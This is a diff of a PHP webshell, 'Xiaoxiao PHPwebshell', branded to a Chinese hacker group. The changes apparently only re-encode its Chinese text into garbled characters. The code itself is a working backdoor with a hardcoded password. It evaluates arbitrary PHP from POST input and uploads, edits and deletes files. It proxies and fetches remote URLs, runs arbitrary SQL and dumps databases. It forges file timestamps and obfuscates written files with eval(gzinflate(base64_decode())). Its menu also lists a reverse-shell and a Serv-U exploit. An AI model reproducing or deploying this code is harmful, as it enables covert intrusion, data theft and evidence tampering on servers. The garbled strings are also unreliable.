@@ -6,9 +6,9 @@ $admin['check'] = "1";
 $admin['pass']  = "xuhuanlingzhe";
 $retime = "no";
 $cmd = "cmd.exe";
-$notice = "[<a href=\"http://www.jxhacker.com\" title=\"Ğ¡º¦³æ\">Ğ¡º¦³æ</a>]  [<a href=\"http://www.jxhacker.com\" title=\"Ğ¡º¦³æ\">Ğ¡º¦³æ</a>]  [<a href=\"http://www.jxhacker.com\" title=\"Ğ¡º¦³æ\">½­Î÷ºÚ¿ÍÁªÃË</a>]<br><FONT color=#ff3300>±¾°æ±¾Ã»ÓĞ°æÈ¨ »¶Ó­µÁ°æ :)</font>";
-/*===================== ÅäÖÃ½áÊø =====================*/
-// ÔÊĞí³ÌĞòÔÚ register_globals = off µÄ»·¾³ÏÂ¹¤×÷
+$notice = "[<a href=\"http://www.jxhacker.com\" title=\"å°å®³è™«\">å°å®³è™«</a>]  [<a href=\"http://www.jxhacker.com\" title=\"å°å®³è™«\">å°å®³è™«</a>]  [<a href=\"http://www.jxhacker.com\" title=\"å°å®³è™«\">æ±Ÿè¥¿é»‘å®¢è”ç›Ÿ</a>]<br><FONT color=#ff3300>æœ¬ç‰ˆæœ¬æ²¡æœ‰ç‰ˆæƒ æ¬¢è¿ç›—ç‰ˆ :)</font>";
+/*===================== é…ç½®ç»“æŸ =====================*/
+// å…è®¸ç¨‹åºåœ¨ register_globals = off çš„ç¯å¢ƒä¸‹å·¥ä½œ
 $onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');
 
 if ($onoff != 1) {
@@ -23,7 +23,7 @@ if($admin['check'] == "1") {
 	if ($_GET['action'] == "logout") {
 		setcookie ("adminpass", "");
 		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
-		echo "<span style=\"font-size: 12px; font-family: Verdana\">Ò»Â·×ßºÃ.²»ËÍÁË...<p><a href=\"".$self."\">ÈıÃëºó×Ô¶¯ÍË³ö»òµ¥»÷ÕâÀïÍË³ö³ÌĞò½çÃæ &gt;&gt;&gt;</a></span>";
+		echo "<span style=\"font-size: 12px; font-family: Verdana\">ä¸€è·¯èµ°å¥½.ä¸é€äº†...<p><a href=\"".$self."\">ä¸‰ç§’åè‡ªåŠ¨é€€å‡ºæˆ–å•å‡»è¿™é‡Œé€€å‡ºç¨‹åºç•Œé¢ &gt;&gt;&gt;</a></span>";
 		exit;
 	}
 
@@ -32,7 +32,7 @@ if($admin['check'] == "1") {
 		if ($admin['pass'] == $thepass) {
 			setcookie ("adminpass",$thepass,time()+(1*24*3600));
 			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
-			echo "<span style=\"font-size: 12px; font-family: Verdana\">Ğ¦Ğ¦ÕæÀ÷º¦.½øÀ´ÁË.<p><a href=\"".$self."\">ÈıÃëºó×Ô¶¯Ìø×ª»òµ¥»÷ÕâÀï½øÈë³ÌĞò½çÃæ &gt;&gt;&gt;</a></span>";
+			echo "<span style=\"font-size: 12px; font-family: Verdana\">ç¬‘ç¬‘çœŸå‰å®³.è¿›æ¥äº†.<p><a href=\"".$self."\">ä¸‰ç§’åè‡ªåŠ¨è·³è½¬æˆ–å•å‡»è¿™é‡Œè¿›å…¥ç¨‹åºç•Œé¢ &gt;&gt;&gt;</a></span>";
 			exit;
 		}
 	}
@@ -45,38 +45,38 @@ if($admin['check'] == "1") {
 	}
 }
 
-// ÅĞ¶Ï magic_quotes_gpc ×´Ì¬
+// åˆ¤æ–­ magic_quotes_gpc çŠ¶æ€
 if (get_magic_quotes_gpc()) {
     $_GET = stripslashes_array($_GET);
 	$_POST = stripslashes_array($_POST);
 }
 
-// ²é¿´PHPINFO
+// æŸ¥çœ‹PHPINFO
 if ($_GET['action'] == "phpinfo") {
-	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() º¯ÊıÒÑ±»½ûÓÃ,Çë²é¿´&lt;PHP»·¾³±äÁ¿&gt;";
+	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() å‡½æ•°å·²è¢«ç¦ç”¨,è¯·æŸ¥çœ‹&lt;PHPç¯å¢ƒå˜é‡&gt;";
 	exit;
 }
 if($_GET['action'] == "nowuser") {
 $user = get_current_user();
-if(!$user) $user = "±¨¸æĞ¦¸ç£¬Ö÷»ú±äÌ¬£¬ÎŞ·¨»ñÈ¡µ±Ç°½øĞĞÓÃ»§Ãû£¡";
-echo"µ±Ç°½ø³ÌÓÃ»§Ãû£º$user";
+if(!$user) $user = "æŠ¥å‘Šç¬‘å“¥ï¼Œä¸»æœºå˜æ€ï¼Œæ— æ³•è·å–å½“å‰è¿›è¡Œç”¨æˆ·åï¼";
+echo"å½“å‰è¿›ç¨‹ç”¨æˆ·åï¼š$user";
 exit;
 }
 if(isset($_POST['phpcode'])){
 	eval("?".">$_POST[phpcode]<?");
 	exit;
 }
-// ÔÚÏß´úÀí
+// åœ¨çº¿ä»£ç†
 if (isset($_POST['url'])) {
 	$proxycontents = @file_get_contents($_POST['url']);
-	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>»ñÈ¡ URL ÄÚÈİÊ§°Ü</b></p></center></body>";
+	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>è·å– URL å†…å®¹å¤±è´¥</b></p></center></body>";
 	exit;
 }
 
-// ÏÂÔØÎÄ¼ş
+// ä¸‹è½½æ–‡ä»¶
 if (!empty($downfile)) {
 	if (!@file_exists($downfile)) {
-		echo "<script>alert('ÄãÒªÏÂµÄÎÄ¼ş²»´æÔÚ!')</script>";
+		echo "<script>alert('ä½ è¦ä¸‹çš„æ–‡ä»¶ä¸å­˜åœ¨!')</script>";
 	} else {
 		$filename = basename($downfile);
 		$filename_info = explode('.', $filename);
@@ -90,13 +90,13 @@ if (!empty($downfile)) {
 	}
 }
 
-// Ö±½ÓÏÂÔØ±¸·İÊı¾İ¿â
+// ç›´æ¥ä¸‹è½½å¤‡ä»½æ•°æ®åº“
 if ($_POST['backuptype'] == 'download') {
-	@mysql_connect($servername,$dbusername,$dbpassword) or die("Êı¾İ¿âÁ¬½ÓÊ§°Ü");
-	@mysql_select_db($dbname) or die("Ñ¡ÔñÊı¾İ¿âÊ§°Ü");	
+	@mysql_connect($servername,$dbusername,$dbpassword) or die("æ•°æ®åº“è¿æ¥å¤±è´¥");
+	@mysql_select_db($dbname) or die("é€‰æ‹©æ•°æ®åº“å¤±è´¥");	
 	$table = array_flip($_POST['table']);
 	$result = mysql_query("SHOW tables");
-	echo ($result) ? NULL : "³ö´í: ".mysql_error();
+	echo ($result) ? NULL : "å‡ºé”™: ".mysql_error();
 
 	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
 	header('Content-type: application/unknown');
@@ -112,10 +112,10 @@ if ($_POST['backuptype'] == 'download') {
 	exit;
 }
 
-// ³ÌĞòÄ¿Â¼
+// ç¨‹åºç›®å½•
 $pathname=str_replace('\\','/',dirname(__FILE__)); 
 
-// »ñÈ¡µ±Ç°Â·¾¶
+// è·å–å½“å‰è·¯å¾„
 if (!isset($dir) or empty($dir)) {
 	$dir = ".";
 	$nowpath = getPath($pathname, $dir);
@@ -124,10 +124,10 @@ if (!isset($dir) or empty($dir)) {
 	$nowpath = getPath($pathname, $dir);
 }
 
-// ÅĞ¶Ï¶ÁĞ´Çé¿ö
-$dir_writeable = (dir_writeable($nowpath)) ? "¿ÉĞ´" : "²»¿ÉĞ´";
+// åˆ¤æ–­è¯»å†™æƒ…å†µ
+$dir_writeable = (dir_writeable($nowpath)) ? "å¯å†™" : "ä¸å¯å†™";
 $phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
-$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">×¢²á±í²Ù×÷</a>" : "";
+$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">æ³¨å†Œè¡¨æ“ä½œ</a>" : "";
 
 $tb = new FORMS;
 
@@ -135,19 +135,19 @@ $tb = new FORMS;
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
-<title>http://<? echo $_SERVER['HTTP_HOST'];?>  Ğ¦Ğ¦PHPwebshell</title>
+<title>http://<? echo $_SERVER['HTTP_HOST'];?>  ç¬‘ç¬‘PHPwebshell</title>
 <style type="text/css">
 body{
 	BACKGROUND-COLOR: #F5F5F5; 
 	COLOR: #3F3849; 
-	font-family: "Verdana", "Tahoma", "ËÎÌå";
+	font-family: "Verdana", "Tahoma", "å®‹ä½“";
 	font-size: "12px";
 	line-height: "140%";
 }
 
-TD		{FONT-FAMILY: "Verdana", "Tahoma", "ËÎÌå"; FONT-SIZE: 12px; line-height: 140%;}
+TD		{FONT-FAMILY: "Verdana", "Tahoma", "å®‹ä½“"; FONT-SIZE: 12px; line-height: 140%;}
 .smlfont {
-	font-family: "Verdana", "Tahoma", "ËÎÌå";
+	font-family: "Verdana", "Tahoma", "å®‹ä½“";
 	font-size: "11px";
 }
 .INPUT {
@@ -194,65 +194,65 @@ function really(d,f,m,t) {
 $test = "";
 if(!$_GET['dir']) $dir = "./";
 $tb->tableheader();
-$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("YÄêmÔÂdÈÕ h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
-$tb->tdbody('| <a href="?action=logout">×¢ÏúµÇÂ¼</a> | <a href="?action=dir">Shell Ä¿Â¼</a> | <a href="?action=phpenv">»·¾³±äÁ¿</a> | <a href="?action=proxy">ÔÚÏß´úÀí</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | ');
-$tb->tdbody('| <a href="?action=downloads">Http ÎÄ¼şÏÂÔØ</a> | <a href="?action=search&dir='.$dir.'">ÎÄ¼ş²éÕÒ</a> | <a href="?action=eval">Ö´ĞĞphp½Å±¾</a> | <a href="?action=sql">Ö´ĞĞSQLÓï¾ä</a> | <a href="?action=sql&type=fun">Func·´µ¯Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> |');
+$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Yå¹´mæœˆdæ—¥ h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
+$tb->tdbody('| <a href="?action=logout">æ³¨é”€ç™»å½•</a> | <a href="?action=dir">Shell ç›®å½•</a> | <a href="?action=phpenv">ç¯å¢ƒå˜é‡</a> | <a href="?action=proxy">åœ¨çº¿ä»£ç†</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | ');
+$tb->tdbody('| <a href="?action=downloads">Http æ–‡ä»¶ä¸‹è½½</a> | <a href="?action=search&dir='.$dir.'">æ–‡ä»¶æŸ¥æ‰¾</a> | <a href="?action=eval">æ‰§è¡Œphpè„šæœ¬</a> | <a href="?action=sql">æ‰§è¡ŒSQLè¯­å¥</a> | <a href="?action=sql&type=fun">Funcåå¼¹Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> |');
 $tb->tablefooter();
 ?>
 <hr width="775" noshade>
 <table width="775" border="0" cellpadding="0">
 <?
-$tb->headerform(array('method'=>'GET','content'=>'<p>³ÌĞòÂ·¾¶: '.$pathname.'<br>µ±Ç°Ä¿Â¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>Ìø×ªÄ¿Â¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','È·¶¨','','submit').' ¡¼Ö§³Ö¾ø¶ÔÂ·¾¶ºÍÏà¶ÔÂ·¾¶¡½'));
+$tb->headerform(array('method'=>'GET','content'=>'<p>ç¨‹åºè·¯å¾„: '.$pathname.'<br>å½“å‰ç›®å½•('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>è·³è½¬ç›®å½•: '.$tb->makeinput('dir').' '.$tb->makeinput('','ç¡®å®š','','submit').' ã€–æ”¯æŒç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ã€—'));
 
-$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'ÉÏ´«ÎÄ¼şµ½µ±Ç°Ä¿Â¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','È·¶¨','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));
+$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'ä¸Šä¼ æ–‡ä»¶åˆ°å½“å‰ç›®å½•: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ç¡®å®š','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));
 
-$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'ĞÂ½¨ÎÄ¼şÔÚµ±Ç°Ä¿Â¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','È·¶¨','','submit')));
+$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'æ–°å»ºæ–‡ä»¶åœ¨å½“å‰ç›®å½•: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ç¡®å®š','','submit')));
 
-$tb->headerform(array('content'=>'ĞÂ½¨Ä¿Â¼ÔÚµ±Ç°Ä¿Â¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','È·¶¨','','submit')));
+$tb->headerform(array('content'=>'æ–°å»ºç›®å½•åœ¨å½“å‰ç›®å½•: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ç¡®å®š','','submit')));
 ?>
 </table>
 <hr width="775" noshade>
 <?php
-/*===================== Ö´ĞĞ²Ù×÷ ¿ªÊ¼ =====================*/
+/*===================== æ‰§è¡Œæ“ä½œ å¼€å§‹ =====================*/
 echo "<p><b>\n";
-// É¾³ıÎÄ¼ş
+// åˆ é™¤æ–‡ä»¶
 if (!empty($delfile)) {
 	if (file_exists($delfile)) {
-		echo (@unlink($delfile)) ? $delfile." É¾³ı³É¹¦!" : "ÎÄ¼şÉ¾³ıÊ§°Ü!";
+		echo (@unlink($delfile)) ? $delfile." åˆ é™¤æˆåŠŸ!" : "æ–‡ä»¶åˆ é™¤å¤±è´¥!";
 	} else {
-		echo basename($delfile)." ÎÄ¼şÒÑ²»´æÔÚ!";
+		echo basename($delfile)." æ–‡ä»¶å·²ä¸å­˜åœ¨!";
 	}
 }
 
-// É¾³ıÄ¿Â¼
+// åˆ é™¤ç›®å½•
 elseif (!empty($deldir)) {
 	$deldirs="$dir/$deldir";
 	if (!file_exists("$deldirs")) {
-		echo "$deldir Ä¿Â¼ÒÑ²»´æÔÚ!";
+		echo "$deldir ç›®å½•å·²ä¸å­˜åœ¨!";
 	} else {
-		echo (deltree($deldirs)) ? "Ä¿Â¼É¾³ı³É¹¦!" : "Ä¿Â¼É¾³ıÊ§°Ü!";
+		echo (deltree($deldirs)) ? "ç›®å½•åˆ é™¤æˆåŠŸ!" : "ç›®å½•åˆ é™¤å¤±è´¥!";
 	}
 }
 
-// ´´½¨Ä¿Â¼
+// åˆ›å»ºç›®å½•
 elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
 	if (!empty($newdirectory)) {
 		$mkdirs="$dir/$newdirectory";
 		if (file_exists("$mkdirs")) {
-			echo "¸ÃÄ¿Â¼ÒÑ´æÔÚ!";
+			echo "è¯¥ç›®å½•å·²å­˜åœ¨!";
 		} else {
-			echo (@mkdir("$mkdirs",0777)) ? "´´½¨Ä¿Â¼³É¹¦!" : "´´½¨Ê§°Ü!";
+			echo (@mkdir("$mkdirs",0777)) ? "åˆ›å»ºç›®å½•æˆåŠŸ!" : "åˆ›å»ºå¤±è´¥!";
 			@chmod("$mkdirs",0777);
 		}
 	}
 }
 
-// ÉÏ´«ÎÄ¼ş
+// ä¸Šä¼ æ–‡ä»¶
 elseif ($doupfile) {
-	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "ÉÏ´«³É¹¦!" : "ÉÏ´«Ê§°Ü!";
+	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "ä¸Šä¼ æˆåŠŸ!" : "ä¸Šä¼ å¤±è´¥!";
 }
 
-// ±à¼­ÎÄ¼ş
+// ç¼–è¾‘æ–‡ä»¶
 elseif ($_POST['do'] == 'doeditfile') {
 	if (!empty($_POST['editfilename'])) {
     if(!file_exists($editfilename)) unset($retime);
@@ -264,90 +264,90 @@ elseif ($_POST['do'] == 'doeditfile') {
 		$filecontent = "?".">".$_POST['filecontent']."<?";
 		$filecontent = gzdeflate($filecontent);
         $filecontent = base64_encode($filecontent);
-        $filecontent = "<?php\n/*\n´úÂëÓÉĞ¦¸ç¼ÓÃÜ!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
+        $filecontent = "<?php\n/*\nä»£ç ç”±ç¬‘å“¥åŠ å¯†!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
 		}else{
 		$filecontent = $_POST['filecontent'];
 		}
-		echo $msg=@fwrite($fp,$filecontent) ? "Ğ´ÈëÎÄ¼ş³É¹¦!" : "Ğ´ÈëÊ§°Ü!";
+		echo $msg=@fwrite($fp,$filecontent) ? "å†™å…¥æ–‡ä»¶æˆåŠŸ!" : "å†™å…¥å¤±è´¥!";
 		@fclose($fp);
 		if($retime=="yes"){
-        echo"&nbsp;³ÌĞò×Ô¶¯²Ù×÷:";
-        echo $msg=@touch($filename,$time) ? "ĞŞ¸ÄÎÄ¼şÎª".$time2."³É¹¦!" : "ĞŞ¸ÄÎÄ¼şÊ±¼äÊ§°Ü!";
+        echo"&nbsp;ç¨‹åºè‡ªåŠ¨æ“ä½œ:";
+        echo $msg=@touch($filename,$time) ? "ä¿®æ”¹æ–‡ä»¶ä¸º".$time2."æˆåŠŸ!" : "ä¿®æ”¹æ–‡ä»¶æ—¶é—´å¤±è´¥!";
 		}
 	} else {
-		echo "ÇëÊäÈëÏëÒª±à¼­µÄÎÄ¼şÃû!";
+		echo "è¯·è¾“å…¥æƒ³è¦ç¼–è¾‘çš„æ–‡ä»¶å!";
 	}
 }
-//ÎÄ¼şÏÂÔØ
+//æ–‡ä»¶ä¸‹è½½
 elseif ($_POST['do'] == 'downloads') {
 	$contents = @file_get_contents($_POST['durl']);
 	if(!$contents){
-	echo"ÎŞ·¨¶ÁÈ¡ÒªÏÂÔØµÄÊı¾İ";
+	echo"æ— æ³•è¯»å–è¦ä¸‹è½½çš„æ•°æ®";
 	}
 	elseif(file_exists($path)){
-	echo"ºÜ±§Ç¸£¬ÎÄ¼ş".$path."ÒÑ¾­´æÔÚÁË£¬Çë¸ü»»±£´æÎÄ¼şÃû¡£";
+	echo"å¾ˆæŠ±æ­‰ï¼Œæ–‡ä»¶".$path."å·²ç»å­˜åœ¨äº†ï¼Œè¯·æ›´æ¢ä¿å­˜æ–‡ä»¶åã€‚";
 	}else{
     $fp = @fopen($path,"w");
-	echo $msg=@fwrite($fp,$contents) ? "ÏÂÔØÎÄ¼ş³É¹¦!" : "ÏÂÔØÎÄ¼şĞ´ÈëÊ±Ê§°Ü!";
+	echo $msg=@fwrite($fp,$contents) ? "ä¸‹è½½æ–‡ä»¶æˆåŠŸ!" : "ä¸‹è½½æ–‡ä»¶å†™å…¥æ—¶å¤±è´¥!";
 	@fclose($fp);
 	}
 }
 
-// ±à¼­ÎÄ¼şÊôĞÔ
+// ç¼–è¾‘æ–‡ä»¶å±æ€§
 elseif ($_POST['do'] == 'editfileperm') {
 	if (!empty($_POST['fileperm'])) {
 		$fileperm=base_convert($_POST['fileperm'],8,10);
-		echo (@chmod($dir."/".$file,$fileperm)) ? "ÊôĞÔĞŞ¸Ä³É¹¦!" : "ĞŞ¸ÄÊ§°Ü!";
-		echo " ÎÄ¼ş ".$file." ĞŞ¸ÄºóµÄÊôĞÔÎª: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
+		echo (@chmod($dir."/".$file,$fileperm)) ? "å±æ€§ä¿®æ”¹æˆåŠŸ!" : "ä¿®æ”¹å¤±è´¥!";
+		echo " æ–‡ä»¶ ".$file." ä¿®æ”¹åçš„å±æ€§ä¸º: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
 	} else {
-		echo "ÇëÊäÈëÏëÒªÉèÖÃµÄÊôĞÔ!";
+		echo "è¯·è¾“å…¥æƒ³è¦è®¾ç½®çš„å±æ€§!";
 	}
 }
 
-// ÎÄ¼ş¸ÄÃû
+// æ–‡ä»¶æ”¹å
 elseif ($_POST['do'] == 'rename') {
 	if (!empty($_POST['newname'])) {
 		$newname=$_POST['dir']."/".$_POST['newname'];
 		if (@file_exists($newname)) {
-			echo "".$_POST['newname']." ÒÑ¾­´æÔÚ,ÇëÖØĞÂÊäÈëÒ»¸ö!";
+			echo "".$_POST['newname']." å·²ç»å­˜åœ¨,è¯·é‡æ–°è¾“å…¥ä¸€ä¸ª!";
 		} else {
-			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." ³É¹¦¸ÄÃûÎª ".$_POST['newname']." !" : "ÎÄ¼şÃûĞŞ¸ÄÊ§°Ü!";
+			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." æˆåŠŸæ”¹åä¸º ".$_POST['newname']." !" : "æ–‡ä»¶åä¿®æ”¹å¤±è´¥!";
 		}
 	} else {
-		echo "ÇëÊäÈëÏëÒª¸ÄµÄÎÄ¼şÃû!";
+		echo "è¯·è¾“å…¥æƒ³è¦æ”¹çš„æ–‡ä»¶å!";
 	}
 }
 elseif ($_POST['do'] == 'search') {
 if(!empty($oldkey)){
-echo"<span class=\"redfont\">²éÕÒ¹Ø¼ü´Ê:[".$oldkey."],ÏÂÃæÏÔÊ¾²éÕÒµÄ½á¹û:";
+echo"<span class=\"redfont\">æŸ¥æ‰¾å…³é”®è¯:[".$oldkey."],ä¸‹é¢æ˜¾ç¤ºæŸ¥æ‰¾çš„ç»“æœ:";
 	if($type2 == "getpath"){
-	echo"Êó±êÒÆµ½½á¹ûÎÄ¼şÉÏ»áÓĞ²¿·Ö½ØÈ¡ÏÔÊ¾.";
+	echo"é¼ æ ‡ç§»åˆ°ç»“æœæ–‡ä»¶ä¸Šä¼šæœ‰éƒ¨åˆ†æˆªå–æ˜¾ç¤º.";
 }
 echo"</span><br><hr width=\"775\" noshade>";
 find($path);
 }else{
-echo"ÄãÒª²éÏºÃ×?µ½µ×Òª²éÏºÃ×ÄØ?ÓĞÃ»ÓĞÏºÃ×ÒªÄã²éÄØ?";
+echo"ä½ è¦æŸ¥è™¾ç±³?åˆ°åº•è¦æŸ¥è™¾ç±³å‘¢?æœ‰æ²¡æœ‰è™¾ç±³è¦ä½ æŸ¥å‘¢?";
 }
 }
 
-// ¿ËÂ¡Ê±¼ä
+// å…‹éš†æ—¶é—´
 elseif ($_POST['do'] == 'domodtime') {
 	if (!@file_exists($_POST['curfile'])) {
-		echo "ÒªĞŞ¸ÄµÄÎÄ¼ş²»´æÔÚ!";
+		echo "è¦ä¿®æ”¹çš„æ–‡ä»¶ä¸å­˜åœ¨!";
 	} else {
 		if (!@file_exists($_POST['tarfile'])) {
-			echo "Òª²ÎÕÕµÄÎÄ¼ş²»´æÔÚ!";
+			echo "è¦å‚ç…§çš„æ–‡ä»¶ä¸å­˜åœ¨!";
 		} else {
 			$time=@filemtime($_POST['tarfile']);
-			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." µÄĞŞ¸ÄÊ±¼ä³É¹¦¸ÄÎª ".date("Y-m-d H:i:s",$time)." !" : "ÎÄ¼şµÄĞŞ¸ÄÊ±¼äĞŞ¸ÄÊ§°Ü!";
+			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." çš„ä¿®æ”¹æ—¶é—´æˆåŠŸæ”¹ä¸º ".date("Y-m-d H:i:s",$time)." !" : "æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ä¿®æ”¹å¤±è´¥!";
 		}
 	}
 }
 
-// ×Ô¶¨ÒåÊ±¼ä
+// è‡ªå®šä¹‰æ—¶é—´
 elseif ($_POST['do'] == 'modmytime') {
 	if (!@file_exists($_POST['curfile'])) {
-		echo "ÒªĞŞ¸ÄµÄÎÄ¼ş²»´æÔÚ!";
+		echo "è¦ä¿®æ”¹çš„æ–‡ä»¶ä¸å­˜åœ¨!";
 	} else {
 		$year=$_POST['year'];
 		$month=$_POST['month'];
@@ -357,43 +357,43 @@ elseif ($_POST['do'] == 'modmytime') {
 		$second=$_POST['second'];
 		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
 			$time=strtotime("$data $month $year $hour:$minute:$second");
-			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." µÄĞŞ¸ÄÊ±¼ä³É¹¦¸ÄÎª ".date("Y-m-d H:i:s",$time)." !" : "ÎÄ¼şµÄĞŞ¸ÄÊ±¼äĞŞ¸ÄÊ§°Ü!";
+			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." çš„ä¿®æ”¹æ—¶é—´æˆåŠŸæ”¹ä¸º ".date("Y-m-d H:i:s",$time)." !" : "æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ä¿®æ”¹å¤±è´¥!";
 		}
 	}
 }
 
-// Á¬½ÓMYSQL
+// è¿æ¥MYSQL
 elseif ($connect) {
 	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
-		echo "Êı¾İ¿âÁ¬½Ó³É¹¦!";
+		echo "æ•°æ®åº“è¿æ¥æˆåŠŸ!";
 		mysql_close();
 	} else {
 		echo mysql_error();
 	}
 }
 
-// Ö´ĞĞSQLÓï¾ä
+// æ‰§è¡ŒSQLè¯­å¥
 elseif ($_POST['do'] == 'query') {
-	@mysql_connect($servername,$dbusername,$dbpassword) or die("Êı¾İ¿âÁ¬½ÓÊ§°Ü");
-	@mysql_select_db($dbname) or die("Ñ¡ÔñÊı¾İ¿âÊ§°Ü");
+	@mysql_connect($servername,$dbusername,$dbpassword) or die("æ•°æ®åº“è¿æ¥å¤±è´¥");
+	@mysql_select_db($dbname) or die("é€‰æ‹©æ•°æ®åº“å¤±è´¥");
 	$result = @mysql_query($_POST['sql_query']);
-	echo ($result) ? "SQLÓï¾ä³É¹¦Ö´ĞĞ!" : "³ö´í: ".mysql_error();
+	echo ($result) ? "SQLè¯­å¥æˆåŠŸæ‰§è¡Œ!" : "å‡ºé”™: ".mysql_error();
 	mysql_close();
 }
 
-// ±¸·İ²Ù×÷
+// å¤‡ä»½æ“ä½œ
 elseif ($_POST['do'] == 'backupmysql') {
 	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
-		echo "ÇëÑ¡ÔñÓû±¸·İµÄÊı¾İ±íºÍ±¸·İ·½Ê½!";
+		echo "è¯·é€‰æ‹©æ¬²å¤‡ä»½çš„æ•°æ®è¡¨å’Œå¤‡ä»½æ–¹å¼!";
 	} else {
 		if ($_POST['backuptype'] == 'server') {
-			@mysql_connect($servername,$dbusername,$dbpassword) or die("Êı¾İ¿âÁ¬½ÓÊ§°Ü");
-			@mysql_select_db($dbname) or die("Ñ¡ÔñÊı¾İ¿âÊ§°Ü");	
+			@mysql_connect($servername,$dbusername,$dbpassword) or die("æ•°æ®åº“è¿æ¥å¤±è´¥");
+			@mysql_select_db($dbname) or die("é€‰æ‹©æ•°æ®åº“å¤±è´¥");	
 			$table = array_flip($_POST['table']);
 			$filehandle = @fopen($path,"w");
 			if ($filehandle) {
 				$result = mysql_query("SHOW tables");
-				echo ($result) ? NULL : "³ö´í: ".mysql_error();
+				echo ($result) ? NULL : "å‡ºé”™: ".mysql_error();
 				while ($currow = mysql_fetch_array($result)) {
 					if (isset($table[$currow[0]])) {
 						sqldumptable($currow[0], $filehandle);
@@ -401,17 +401,17 @@ elseif ($_POST['do'] == 'backupmysql') {
 					}
 				}
 				fclose($filehandle);
-				echo "Êı¾İ¿âÒÑ³É¹¦±¸·İµ½ <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
+				echo "æ•°æ®åº“å·²æˆåŠŸå¤‡ä»½åˆ° <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
 				mysql_close();
 			} else {
-				echo "±¸·İÊ§°Ü,ÇëÈ·ÈÏÄ¿±êÎÄ¼ş¼ĞÊÇ·ñ¾ßÓĞ¿ÉĞ´È¨ÏŞ!";
+				echo "å¤‡ä»½å¤±è´¥,è¯·ç¡®è®¤ç›®æ ‡æ–‡ä»¶å¤¹æ˜¯å¦å…·æœ‰å¯å†™æƒé™!";
 			}
 		}
 	}
 }
 
-// ´ò°üÏÂÔØ PS:ÎÄ¼şÌ«´ó¿ÉÄÜ·Ç³£Âı
-// Thx : Ğ¦¸ç
+// æ‰“åŒ…ä¸‹è½½ PS:æ–‡ä»¶å¤ªå¤§å¯èƒ½éå¸¸æ…¢
+// Thx : ç¬‘å“¥
 elseif($downrar) {
 	if (!empty($dl)) {
 		$dfiles="";
@@ -429,40 +429,40 @@ elseif($downrar) {
